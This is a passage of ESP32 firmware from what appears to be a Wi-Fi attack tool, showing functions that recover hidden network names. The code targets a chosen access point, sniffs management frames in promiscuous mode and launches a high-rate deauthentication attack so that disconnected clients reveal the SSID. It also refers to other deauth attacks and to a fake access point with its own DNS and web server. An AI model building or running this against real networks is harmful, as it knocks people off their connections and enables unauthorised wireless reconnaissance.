void startHiddenRecovery() {
    lastActivityTime = millis();
  // Stop any other active attacks
  apDeauthActive = false;
  stationDeauthActive = false;
  deauthing_active = false;
  attack_running = false;

  bool wasApRunning = apAndWebRunning;
  
  
  if (deauthMonitorActive) stopDeauthMonitor();
  if (isScanningStations) stopStationScan();

  for (int i = 0; i < hiddenNetworkCount; i++) {
    if (compareBSSID(hiddenNetworks[i].bssid, hiddenTargetBSSID)) {
      if (hiddenNetworks[i].ssid.length() > 0) {
       
        hiddenNetworks[i].ssid = "";
      }
      break;
    }
  }


digitalWrite(LED_PIN, HIGH);
if (wasApRunning) {
    webServer.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    apAndWebRunning = false;
  }
  // Configure WiFi for promiscuous mode
  WiFi.mode(WIFI_OFF);
  delay(100);
  
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  
  esp_wifi_set_promiscuous(true);
  
  wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
  esp_wifi_set_promiscuous_filter(&filter);
  
  esp_wifi_set_promiscuous_rx_cb(hiddenSSIDCallback);
  esp_wifi_set_channel(hiddenTargetChannel, WIFI_SECOND_CHAN_NONE);
  
  hiddenRecoveryActive = true;
  hiddenRecoveredSSID = "";
  hiddenRecoveryStartTime = millis();
  // Clear any previous found MAC
  hiddenFoundMAC = "";
  //hiddenFoundMACTime = 0;
  
  // Start 10-second high-rate deauth
  hiddenDeauthActive = true;
  hiddenDeauthPacketCount = 0;
  lastHiddenDeauthTime = 0;
  
  currentScreen = SCREEN_HIDDEN_RECOVER;
}

void stopHiddenRecovery() {
  hiddenRecoveryActive = false;
  hiddenDeauthActive = false;

   if (hiddenRecoveredSSID.length() > 0) {
        for (int i = 0; i < MAX_TARGETS; i++) {
            if (_networks[i].selected && compareBSSID(_networks[i].bssid, hiddenTargetBSSID)) {
                _networks[i].ssid = hiddenRecoveredSSID;
                Serial.printf("Updated AP SSID: %s\n", hiddenRecoveredSSID.c_str());
                break;
            }
        }
    }

  digitalWrite(LED_PIN, LOW);
  
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_stop();
  delay(100);
  startAccessPoint();
}
void startNextHiddenRecovery() {
    // Count total hidden selected APs
    hiddenRecoveryTotal = 0;
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (_networks[i].selected && isValidAP(_networks[i]) && _networks[i].ssid.length() == 0) {
            hiddenRecoveryTotal++;
        }
    }
    
    if (hiddenRecoveryTotal == 0) {
        // No hidden APs, return to main
        currentScreen = SCREEN_MAIN;
        return;
    }
    
    // Find the current index to recover
    int found = 0;
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (_networks[i].selected && isValidAP(_networks[i]) && _networks[i].ssid.length() == 0) {
            if (found == hiddenRecoveryIndex) {
                memcpy(hiddenTargetBSSID, _networks[i].bssid, 6);
                hiddenTargetChannel = _networks[i].ch;
                
                // Store the original AP info for later update
                char bssidStr[18];
                snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                         hiddenTargetBSSID[0], hiddenTargetBSSID[1], hiddenTargetBSSID[2],
                         hiddenTargetBSSID[3], hiddenTargetBSSID[4], hiddenTargetBSSID[5]);
                
                Serial.printf("Recovering hidden AP %d/%d (BSSID: %s, ch %d)\n", 
                             hiddenRecoveryIndex + 1, hiddenRecoveryTotal,
                             bssidStr, hiddenTargetChannel);
                
                startHiddenRecovery();
                return;
            }
            found++;
        }
    }
}
